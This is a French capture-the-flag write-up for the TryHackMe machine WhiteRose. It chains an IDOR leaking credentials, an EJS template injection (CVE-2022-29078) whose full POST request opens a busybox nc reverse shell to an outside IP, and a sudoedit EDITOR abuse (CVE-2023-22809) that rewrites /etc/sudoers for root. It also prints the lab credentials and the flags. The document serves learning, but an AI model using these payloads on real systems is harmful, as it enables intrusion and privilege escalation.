# Write-up -- TryHackMe : WhiteRose
 
Write-up réalisé pour la machine WhiteRose de TryHackMe. La chaîne d'exploitation enchaîne une IDOR sur une messagerie interne pour escalader les droits applicatifs, une injection de template EJS (CVE-2022-29078) pour obtenir un shell, et une escalade de privilèges via une faille dans `sudoedit` (CVE-2023-22809) qui permet d'éditer des fichiers arbitraires en abusant de la variable d'environnement `EDITOR`.
 
L'IP de la machine pendant ma session était `10.130.188.122`.
 
---
 
## Étape 1 -- Scan des ports ouverts
 
```bash
nmap -sS -sV -sC -p- 10.130.188.122
```
 
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
```
 
**2 ports TCP ouverts** : SSH sur le 22 et un serveur web nginx sur le 80. La page d'accueil affiche simplement un message de maintenance de la "National Bank of Cyprus". On ajoute le domaine à `/etc/hosts` :
 
```bash
sudo nano /etc/hosts
# 10.130.188.122  cyprusbank.thm
```
 
Une énumération de répertoires avec gobuster sur le domaine principal ne donne rien d'exploitable.
 
---
 
## Étape 2 -- Découverte du sous-domaine admin et accès initial
 
On passe en mode vhost pour chercher des sous-domaines :
 
```bash
gobuster vhost -u http://cyprusbank.thm/ \
    -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
    --append-domain
```
 
```
admin.cyprusbank.thm  Status: 302 [--> /login]
```
 
On l'ajoute à `/etc/hosts` et on visite la page de login. Le challenge fournit des credentials de départ : **`Olivia Cortez:olivi8`**. La connexion fonctionne.
 
On arrive sur un tableau de bord bancaire avec des paiements et des comptes clients. Deux observations immédiates : les **numéros de téléphone sont masqués** et l'**onglet Settings est inaccessible** avec ce compte les droits sont insuffisants.
 
---
 
## Étape 3 -- IDOR sur la messagerie et escalade de compte
 
En naviguant vers l'onglet **Messages**, l'URL est :
 
```
http://admin.cyprusbank.thm/messages/?c=5
```
 
Le paramètre `c` contrôle quel fil de messages est affiché. C'est une **IDOR**, aucune vérification côté serveur ne s'assure qu'on a le droit de consulter les messages des autres utilisateurs. On remplace `5` par `0` et on consulte les messages précédents.
 
On y trouve de nouveaux credentials : **`Gayle Bev:p~]P@5!6;rs558:q`**
 
On se déconnecte et on se reconnecte avec ce compte. Cette fois les droits sont complets : les numéros de téléphone apparaissent en clair et l'onglet Settings est accessible. On peut répondre à la première question du challenge :
 
```
What's Tyrell Wellick's phone number?
→ 842-029-5701
```
 
---
 
## Étape 4 -- Fausse piste : XSS sur la page Settings
 
L'onglet Settings permet de modifier le mot de passe d'un client et l'affiche en clair dans la page une fois changé. On tente d'abord de **modifier le mot de passe de Gayle Bev** pour vérifier qu'on peut prendre le contrôle du compte, mais en se reconnectant, le mot de passe n'est pas réellement mis à jour côté base de données.
 
L'affichage du mot de passe en clair dans la page évoque du **XSS**. On tente quelques payloads classiques :
 
```
<script>alert(1)</script>
```
 
Aucun résultat, les entrées sont correctement échappées dans ce contexte. Cette piste ne mène nulle part.
 
---
 
## Étape 5 -- Découverte du moteur de template EJS via l'erreur 500
 
On intercepte la requête de changement de mot de passe dans Burp Suite et on **supprime le paramètre `password`** avant de l'envoyer. Le serveur répond avec une erreur 500 qui expose la stack trace complète :
 
```
ReferenceError: /home/web/app/views/settings.ejs:14
    12|     <div class="alert alert-info mb-3"><%= message %></div>
    13|   <% } %>
>>  14|   <% if (password != -1) { %>
    15|     <div class="alert alert-success mb-3">Password updated to '<%= password %>'</div>
    16|   <% } %>
 
password is not defined
    at eval ("/home/web/app/views/settings.ejs":27:8)
    at settings (/home/web/app/node_modules/ejs/lib/ejs.js:692:17)
```
 
Deux informations critiques : le moteur de template est **EJS**, et le fichier de route est `/home/web/app/routes/settings.js`. Le chemin absolu sur le serveur est exposé, ce qui confirme qu'on est dans une application Node.js/Express.
 
EJS est connu pour une vulnérabilité d'injection de template : la **CVE-2022-29078**.
 
---
 
## Étape 6 -- CVE-2022-29078 : SSTI sur EJS et obtention d'un shell
 
La CVE-2022-29078 exploite l'option `outputFunctionName` des `view options` d'EJS. Cette option est censée permettre de personnaliser le nom de la fonction de sortie, mais EJS l'insère directement dans le code JavaScript généré pour le template **sans l'assainir**. En y injectant du code JavaScript arbitraire, on provoque son exécution côté serveur avec les droits du processus Node.
 
Le payload passé dans le corps de la requête POST :
 
```
settings[view options][outputFunctionName]=x;<code_js>;//
```
 
La structure `settings[view options][outputFunctionName]` exploite la façon dont Express parse les corps de requête URL-encodés : les crochets imbriqués construisent un objet JavaScript, ce qui injecte notre valeur directement dans les options de rendu EJS.
 
On démarre un listener :
 
```bash
nc -lvnp 4444
```
 
Le premier payload trouvé dans le POC de référence ne fonctionne pas. Après plusieurs essais, on trouve un payload fonctionnel qui utilise `busybox nc` :
 
```
name=test&password=pass&settings[view options][outputFunctionName]=x;process.mainModule.require('child_process').execSync('busybox nc 10.10.15.45 4444 -e /bin/bash');//
```
 
On envoie la requête depuis Burp Suite :
 
```http
POST /settings HTTP/1.1
Host: admin.cyprusbank.thm
Content-Type: application/x-www-form-urlencoded
Cookie: connect.sid=s%3A8vdo_nT4u_LizjjTULQCwH3yF9RVR9u4.s9DAkevHQjbI%2F3%2BHDyFuNHiTG2l%2FiZlgJ3O59K2%2FZpk
 
name=test&password=pass&settings[view options][outputFunctionName]=x;process.mainModule.require('child_process').execSync('busybox nc 10.10.15.45 4444 -e /bin/bash');//
```
 
La connexion arrive sur le listener. On stabilise le shell :
 
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```
 
On est en tant qu'utilisateur **`web`**.
 
---
 
## Étape 7 -- Flag user et fouille du répertoire applicatif
 
```bash
web@cyprusbank:~$ cat user.txt
```
 
**Flag user :** `THM{4lways_upd4te_uR_d3p3nd3nc!3s}`
 
On explore le répertoire de l'application dans `/home/web/app`. Le `.env` contient la configuration de la base :
 
```
MONGO=mongodb://localhost
SECRET=secureappsecret
PORT=8080
```
 
MongoDB tourne uniquement sur localhost (`bind_ip = 127.0.0.1`), inaccessible depuis l'extérieur. Rien d'exploitable pour l'escalade depuis là.
 
---
 
## Étape 8 -- CVE-2023-22809 : escalade via sudoedit et variable EDITOR
 
On vérifie les droits sudo de `web` :
 
```bash
sudo -l
```
 
```
User web may run the following commands on cyprusbank:
    (root) NOPASSWD: sudoedit /etc/nginx/sites-available/admin.cyprusbank.thm
```
 
`web` peut éditer un fichier de configuration nginx en root via `sudoedit`. Une recherche sur `sudoedit` révèle la **CVE-2023-22809** : une faille où `sudoedit` lit la variable d'environnement `EDITOR` pour choisir l'éditeur à lancer, mais **ne valide pas son contenu**. En passant `vim -- /fichier/arbitraire`, l'espace et le double tiret sont interprétés comme des arguments, ce qui force vim à ouvrir un second fichier en plus de celui autorisé, avec les droits root.
 
On va s'en servir pour modifier `/etc/sudoers` directement.
 
**Fausse piste : shell instable :**
 
On exporte la variable et on lance sudoedit, mais impossible de quitter vim, le shell instable ne transmet pas correctement les touches de contrôle. On est bloqué.
 
On recommence depuis le début en stabilisant correctement le shell avant de tout faire :
 
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
```
 
On exporte l'éditeur malveillant :
 
```bash
export EDITOR="vim -- /etc/sudoers"
```
 
On lance `sudoedit` sur le fichier autorisé. Sudo ouvre vim avec les deux fichiers en root :
 
```bash
sudoedit /etc/nginx/sites-available/admin.cyprusbank.thm
```
 
Dans vim, on va à la dernière ligne avec `G`, on passe en mode insertion avec `o`, et on ajoute la ligne :
 
```
web ALL=(ALL) NOPASSWD: ALL
```
 
On enregistre et quitte avec `Echap` puis `:wq`. On vérifie que la modification a bien été prise en compte :
 
```bash
sudo -l
```
 
```
User web may run the following commands on cyprusbank:
    (root) NOPASSWD: sudoedit /etc/nginx/sites-available/admin.cyprusbank.thm
    (ALL) NOPASSWD: ALL
```
 
On se connecte en root :
 
```bash
sudo su
```
 
---
 
## Étape 9 -- Flag root
 
```bash
root@cyprusbank:/tmp# cat /root/root.txt
```
 
**Flag root :** `THM{4nd_uR_p4ck4g3s}`
